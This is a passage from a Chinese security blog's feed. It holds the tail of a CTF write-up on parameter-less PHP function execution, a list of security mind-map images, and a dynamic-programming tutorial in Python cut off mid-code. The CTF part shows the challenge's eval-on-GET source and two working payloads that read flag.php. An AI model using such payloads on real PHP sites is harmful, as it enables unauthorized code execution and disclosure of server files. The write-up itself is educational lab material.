title="phpversion()"></a><strong>phpversion()</strong></h5><ul><li><code>phpversion()</code>返回php版本，如<code>7.3.5</code></li><li><code>floor(phpversion())</code>返回<code>7</code></li><li><code>sqrt(floor(phpversion()))</code>返回<code>2.6457513110646</code></li><li><code>tan(floor(sqrt(floor(phpversion()))))</code>返回<code>-2.1850398632615</code></li><li><code>cosh(tan(floor(sqrt(floor(phpversion())))))</code>返回<code>4.5017381103491</code></li><li><code>sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))</code>返回<code>45.081318677156</code></li><li><code>ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))</code>返回<code>46</code></li><li><code>chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))</code>返回<code>.</code></li><li><code>var_dump(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))</code>扫描当前目录</li><li><code>next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))</code>返回<code>..</code></li></ul><p><strong>floor()</strong>：舍去法取整，<strong>sqrt()</strong>：平方根，<strong>tan()</strong>：正切值，<strong>cosh()</strong>：双曲余弦，<strong>sinh()</strong>：双曲正弦，<strong>ceil()</strong>：进一法取整</p><h5 id="crypt"><a href="#crypt" class="headerlink" title="crypt()"></a><strong>crypt()</strong></h5><p><code>chr(ord(hebrevc(crypt(phpversion()))))</code>返回<code>.</code></p><ul><li><code>hebrevc(crypt(arg))</code>可以随机生成一个hash值 第一个字符随机是 $(大概率) 或者 .(小概率) 然后通过ord chr只取第一个字符</li></ul><p><strong>crypt()</strong>：单向字符串散列，返回散列后的字符串或一个少于 13 字符的字符串，从而保证在失败时与盐值区分开来。</p><p><strong>hebrevc()</strong>：将逻辑顺序希伯来文（logical-Hebrew）转换为视觉顺序希伯来文（visual-Hebrew），并且转换换行符，返回视觉顺序字符串。</p><h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4><p><strong>current()</strong>的别名<strong>pos()</strong></p><p><strong>readgzfile</strong>可以代替<strong>readfile</strong></p><p>目录操作：</p><ul><li><strong>getchwd()</strong> ：函数返回当前工作目录。</li><li><strong>scandir()</strong> ：函数返回指定目录中的文件和目录的数组。</li><li><strong>dirname()</strong> ：函数返回路径中的目录部分。</li><li><strong>chdir()</strong> ：函数改变当前的目录。</li></ul><p>数组相关的操作：</p><ul><li><a href="https://www.w3school.com.cn/php/func_array_end.asp" target="_blank" rel="noopener">end()</a> ： 将内部指针指向数组中的最后一个元素，并输出</li><li><a href="https://www.w3school.com.cn/php/func_array_next.asp" target="_blank" rel="noopener">next()</a> ：将内部指针指向数组中的下一个元素，并输出</li><li><a href="https://www.w3school.com.cn/php/func_array_prev.asp" target="_blank" rel="noopener">prev()</a> ：将内部指针指向数组中的上一个元素，并输出</li><li><a href="https://www.w3school.com.cn/php/func_array_reset.asp" target="_blank" rel="noopener">reset()</a> ： 将内部指针指向数组中的第一个元素，并输出</li><li><a href="https://www.w3school.com.cn/php/func_array_each.asp" target="_blank" rel="noopener">each()</a> ： 返回当前元素的键名和键值，并将内部指针向前移动</li></ul><h4 id="栗子"><a href="#栗子" class="headerlink" title="栗子"></a>栗子</h4><h5 id="GXYCTF2019—禁止套娃"><a href="#GXYCTF2019—禁止套娃" class="headerlink" title="GXYCTF2019—禁止套娃"></a>GXYCTF2019—禁止套娃</h5><p>扫描目录<code>.git</code>源码泄露，<code>Githack</code>得到<code>index</code>源码</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"flag在哪里呢？&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/[a-z,_]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token keyword">NULL</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// echo $_GET['exp'];</span>                @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"还差一点哦！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"再好好想想！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"还想读flag，臭弟弟！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// highlight_file(__FILE__);</span><span class="token delimiter">?></span></code></pre><p>payload1：</p><pre class=" language-php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token function">array_reverse</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">current</span><span class="token punctuation">(</span><span class="token function">localeconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>payload2：</p><pre class=" language-php"><code class="language-php"><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token function">session_id</span><span class="token punctuation">(</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Cookie<span class="token punctuation">:</span> <span class="token constant">PHPSESSID</span><span class="token operator">=</span>flag<span class="token punctuation">.</span>php</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;参考：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.cnblogs.com/wangtanzhi/p/12260986.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.cnblogs.com/wangtanzhi/p/12260986.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.manongjc.com/detail/13-ksgbihhdbvdbnza.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.manongjc.com/detail/13-ksgbihhdbvdbnza.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.gem-love.com/ctf/530.html?replytocom=5&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.gem-love.com/ctf/530.html?replytocom=5&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;膜膜膜膜膜膜（这东西真的是奇淫技巧）&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.extrader.top/categories/CTF/"/>
    
    
      <category term="CTF题" scheme="https://www.extrader.top/tags/CTF%E9%A2%98/"/>
    
      <category term="php" scheme="https://www.extrader.top/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>思维导图收集</title>
    <link href="https://www.extrader.top/2020/04/27/%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE%E6%94%B6%E9%9B%86/"/>
    <id>https://www.extrader.top/2020/04/27/%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE%E6%94%B6%E9%9B%86/</id>
    <published>2020-04-27T02:56:56.000Z</published>
    <updated>2020-07-14T09:03:18.450Z</updated>
    
    <content type="html"><![CDATA[<h3 id="GIT命令"><a href="#GIT命令" class="headerlink" title="GIT命令"></a>GIT命令</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/思维导图收集/git命令.jpg" alt="git命令" style="zoom: 25%;" / loading="lazy"><h3 id="网络安全绪论"><a href="#网络安全绪论" class="headerlink" title="网络安全绪论"></a>网络安全绪论</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/思维导图收集/网络安全绪论.jpg" alt="网络安全绪论" style="zoom:25%;" / loading="lazy"><h3 id="网络安全发展与未来"><a href="#网络安全发展与未来" class="headerlink" title="网络安全发展与未来"></a>网络安全发展与未来</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/思维导图收集/网络安全发展与未来.jpg" alt="网络安全发展与未来" style="zoom:25%;" / loading="lazy"><h3 id="Web攻击及防御技术"><a href="#Web攻击及防御技术" class="headerlink" title="Web攻击及防御技术"></a>Web攻击及防御技术</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/思维导图收集/Web攻击及防御技术.jpg" alt="Web攻击及防御技术" style="zoom:25%;" / loading="lazy"><h3 id="网络监听及防御技术"><a href="#网络监听及防御技术" class="headerlink" title="网络监听及防御技术"></a>网络监听及防御技术</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/思维导图收集/网络监听及防御技术.jpg" alt="网络监听及防御技术" style="zoom:25%;" / loading="lazy"><h3 id="扫描与防御技术"><a href="#扫描与防御技术" class="headerlink" title="扫描与防御技术"></a>扫描与防御技术</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/思维导图收集/扫描与防御技术.jpg" alt="扫描与防御技术" style="zoom:25%;" / loading="lazy"><h3 id="欺骗攻击及防御技术"><a href="#欺骗攻击及防御技术" class="headerlink" title="欺骗攻击及防御技术"></a>欺骗攻击及防御技术</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/思维导图收集/欺骗攻击及防御技术.jpg" alt="欺骗攻击及防御技术" style="zoom:25%;" / loading="lazy"><h3 id="木马攻击及防御技术"><a href="#木马攻击及防御技术" class="headerlink" title="木马攻击及防御技术"></a>木马攻击及防御技术</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/思维导图收集/木马攻击及防御技术.jpg" alt="木马攻击及防御技术" style="zoom:25%;" / loading="lazy"><h3 id="口令破解与防御技术"><a href="#口令破解与防御技术" class="headerlink" title="口令破解与防御技术"></a>口令破解与防御技术</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/思维导图收集/口令破解与防御技术.jpg" alt="口令破解与防御技术" style="zoom:25%;" / loading="lazy"><h3 id="拒绝服务供给与防御技术"><a href="#拒绝服务供给与防御技术" class="headerlink" title="拒绝服务供给与防御技术"></a>拒绝服务供给与防御技术</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/思维导图收集/拒绝服务供给与防御技术.png" alt="拒绝服务供给与防御技术" style="zoom:25%;" / loading="lazy"><h3 id="缓冲区溢出攻击及防御技术"><a href="#缓冲区溢出攻击及防御技术" class="headerlink" title="缓冲区溢出攻击及防御技术"></a>缓冲区溢出攻击及防御技术</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/思维导图收集/缓冲区溢出攻击及防御技术.jpg" alt="缓冲区溢出攻击及防御技术" style="zoom:25%;" / loading="lazy"><h3 id="计算机病毒"><a href="#计算机病毒" class="headerlink" title="计算机病毒"></a>计算机病毒</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/思维导图收集/计算机病毒.jpg" alt="计算机病毒" style="zoom:25%;" / loading="lazy"><h3 id="网络攻击链手段防护产品"><a href="#网络攻击链手段防护产品" class="headerlink" title="网络攻击链手段防护产品"></a>网络攻击链手段防护产品</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/思维导图收集/网络攻击链手段防护产品.png" alt="网络攻击链手段防护产品" style="zoom:10%;" / loading="lazy"><h3 id="nginx源码分析全景图"><a href="#nginx源码分析全景图" class="headerlink" title="nginx源码分析全景图"></a>nginx源码分析全景图</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/思维导图收集/nginx源码分析全景图.png" alt="nginx源码分析全景图" style="zoom:6%;" / loading="lazy"><p>另外在P神的github上也有些：<a href="https://github.com/phith0n/Mind-Map" target="_blank" rel="noopener">https://github.com/phith0n/Mind-Map</a></p><ul><li>图片均来自网络，侵删</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;GIT命令&quot;&gt;&lt;a href=&quot;#GIT命令&quot; class=&quot;headerlink&quot; title=&quot;GIT命令&quot;&gt;&lt;/a&gt;GIT命令&lt;/h3&gt;&lt;img src=&quot;https://gitee.com/Extrader/blogimage/raw/master/ima
      
    
    </summary>
    
    
      <category term="备忘录" scheme="https://www.extrader.top/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
    
      <category term="思维导图" scheme="https://www.extrader.top/tags/%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/"/>
    
  </entry>
  
  <entry>
    <title>算法-动态规划</title>
    <link href="https://www.extrader.top/2020/04/21/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"/>
    <id>https://www.extrader.top/2020/04/21/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/</id>
    <published>2020-04-21T09:23:34.000Z</published>
    <updated>2020-07-14T10:40:58.879Z</updated>
    
    <content type="html"><![CDATA[<h3 id="斐波拉契数列"><a href="#斐波拉契数列" class="headerlink" title="斐波拉契数列"></a>斐波拉契数列</h3><p><code>1,1,2,3,5,8,13...</code>，状态转移方程：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200421190059738.png" alt="" loading="lazy"></p><a id="more"></a><h4 id="暴力递归"><a href="#暴力递归" class="headerlink" title="暴力递归"></a><strong>暴力递归</strong></h4><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> a <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">or</span> a <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">1</span>    <span class="token keyword">return</span> main<span class="token punctuation">(</span>a<span class="token number">-1</span><span class="token punctuation">)</span> <span class="token operator">+</span> main<span class="token punctuation">(</span>a<span class="token number">-2</span><span class="token punctuation">)</span></code></pre><p>时间复杂度为<code>O(2^n)</code>，有如下递归树：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200421190828749.png" alt="" loading="lazy"></p><p>我们可以看到许多的计算都重复了，例如下面的<code>f(18)</code>等，那么如何避免这个问题呢？有效的方法就是将第一次计算出的<code>f(18)</code>的结果保留下来，如果下次再计算到这个<code>f(18)</code>的时候直接将结果取出来即可，简称备忘录方法，如下：</p><h4 id="带备忘录的递归解法"><a href="#带备忘录的递归解法" class="headerlink" title="带备忘录的递归解法"></a><strong>带备忘录的递归解法</strong></h4><pre class=" language-python"><code class="language-python">memo <span class="token operator">=</span> dict<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> a <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">or</span> a <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">1</span>    <span class="token keyword">if</span> a <span class="token keyword">in</span> memo<span class="token punctuation">:</span>        <span class="token keyword">return</span> memo<span class="token punctuation">[</span>a<span class="token punctuation">]</span>    memo<span class="token punctuation">[</span>a<span class="token punctuation">]</span> <span class="token operator">=</span> main<span class="token punctuation">(</span>a<span class="token number">-1</span><span class="token punctuation">)</span> <span class="token operator">+</span> main<span class="token punctuation">(</span>a<span class="token number">-2</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> main<span class="token punctuation">(</span>a<span class="token number">-1</span><span class="token punctuation">)</span> <span class="token operator">+</span> main<span class="token punctuation">(</span>a<span class="token number">-2</span><span class="token punctuation">)</span></code></pre><h4 id="DP-table解法"><a href="#DP-table解法" class="headerlink" title="DP table解法"></a><strong>DP table解法</strong></h4><p>自底向上优化</p><pre class=" language-python"><code class="language-python">dp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> a <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">or</span> a <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">1</span>    dp<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    dp<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">:</span>        dp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> dp<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> dp<span class="token punctuation">[</span>a<span class="token number">-1</span><span class="token punctuation">]</span></code></pre><p>原理图如下(emmmmm，图是搬运过来的，所以前面的第0位还是用到了的，往前移一位就行了)</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200421190143099.png" alt="" loading="lazy"></p><h4 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h4><p>再进行空间复杂度的优化</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> a <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">or</span> a <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">1</span>    prev <span class="token operator">=</span> <span class="token number">1</span>    curr <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> a <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        num <span class="token operator">=</span> prev <span class="token operator">+</span> curr        prev <span class="token operator">=</span> curr        curr <span class="token operator">=</span> num    <span class="token keyword">return</span> curr</code></pre><p>由原来的时间复杂度<code>O(2^n)</code>变为了<code>O(n)</code>，空间复杂度降为<code>O(1)</code></p><h3 id="凑零钱问题"><a href="#凑零钱问题" class="headerlink" title="凑零钱问题"></a>凑零钱问题</h3><p>假设给你<code>k</code>中面值的硬币，面值分别为<code>c1，c2，c3 ... ck</code>，每种硬币的数量无限，再给一个总金额<code>amount</code>，问<strong>最少</strong>需要几枚硬币凑出这个金额，如果不可能凑出，则返回-1</p><p>状态转移方程：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200421185311310.png" alt="" loading="lazy"></p><h4 id="暴力递归-1"><a href="#暴力递归-1" class="headerlink" title="暴力递归"></a><strong>暴力递归</strong></h4><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">coinChange</span><span class="token punctuation">(</span>coins<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># 当n - coin = 0 的时候说明这条路走的通</span>            <span class="token keyword">return</span> <span class="token number">0</span>        <span class="token keyword">if</span> n <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># 当n - coin &lt; 0 的时候则说明这条路走不通</span>            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span>        res <span class="token operator">=</span> float<span class="token punctuation">(</span><span class="token string">"INF"</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># float("INF")为正无穷大，负无穷大则为float("-INF")</span>        <span class="token keyword">for</span> coin <span class="token keyword">in</span> coins<span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># 递归列表</span>            sub <span class="token operator">=</span> main<span class="token punctuation">(</span>n <span class="token operator">-</span> coin<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 取出一个值n就要减去那个值</span>            <span class="token keyword">if</span> sub <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>                <span class="token keyword">continue</span>  <span class="token comment" spellcheck="true"># 当main函数的返回值为-1的时候，这条路走不通，则挑出循环</span>            res <span class="token operator">=</span> min<span class="token punctuation">(</span>res<span class="token punctuation">,</span> <span class="token number">1</span> <span class="token operator">+</span> sub<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 当到了树的最低下，上面的if语句没有执行跳出去，则使res=sub+1</span>        <span class="token keyword">return</span> res <span class="token keyword">if</span> res <span class="token operator">!=</span> float<span class="token punctuation">(</span><span class="token string">"INF"</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token operator">-</span><span class="token number">1</span>  <span class="token comment" spellcheck="true"># 这条路走的通，则返回res的值给sub，结合上面的一条语句进行计数</span>    <span class="token keyword">return</span> main<span class="token punctuation">(</span>amount<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 最后取出第一个选择的那个数字的时候计算出的res最小值，然后再把每个数字的最小值拿出来比较得出最终的最小值</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>coinChange<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>以上的路走的通的意思是能够凑出这些硬币，递归图如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200421185848166.png" alt="" loading="lazy"></p><h4 id="带备忘录的递归解法-1"><a href="#带备忘录的递归解法-1" class="headerlink" title="带备忘录的递归解法"></a><strong>带备忘录的递归解法</strong></h4><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">coinChange</span><span class="token punctuation">(</span>coins<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">:</span>    memo <span class="token operator">=</span> dict<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> n <span class="token keyword">in</span> memo<span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># 查找备忘录，避免重复计算，就是计算以上颜色相同的部分</span>            <span class="token keyword">return</span> memo<span class="token punctuation">[</span>n<span class="token punctuation">]</span>        <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token number">0</span>        <span class="token keyword">if</span> n <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span>        res <span class="token operator">=</span> float<span class="token punctuation">(</span><span class="token string">"INF"</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> coin <span class="token keyword">in</span> coins<span class="token punctuation">:</span>            sub <span class="token operator">=</span> main<span class="token punctuation">(</span>n <span class="token operator">-</span> coin<span class="token punctuation">)</span>            <span class="token keyword">if</span> sub <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>                <span class="token keyword">continue</span>            res <span class="token operator">=</span> min<span class="token punctuation">(</span>res<span class="token punctuation">,</span> <span class="token number">1</span> <span class="token operator">+</span> sub<span class="token punctuation">)</span>        memo<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>res <span class="token keyword">if</span> res <span class="token operator">!=</span> float<span class="token punctuation">(</span><span class="token string">"INF"</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> memo<span class="token punctuation">[</span>n<span class="token punctuation">]</span>    <span class="token keyword">return</span> main<span class="token punctuation">(</span>amount<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>coinChange<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h4 id="DP-table解法-1"><a href="#DP-table解法-1" class="headerlink" title="DP table解法"></a><strong>DP table解法</strong></h4><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>coins<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>a <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        dp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>a <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> coin <span class="token keyword">in</span> coins<span class="token punctuation">:</span>            <span class="token keyword">if</span> i <span class="token operator">-</span> coin <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">continue</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> min<span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token operator">+</span> dp<span class="token punctuation">[</span>i <span class="token operator">-</span> coin<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">if</span> dp<span class="token punctuation">[</span>a<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token punctuation">(</span>a <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">else</span> dp<span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    dp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>main<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token 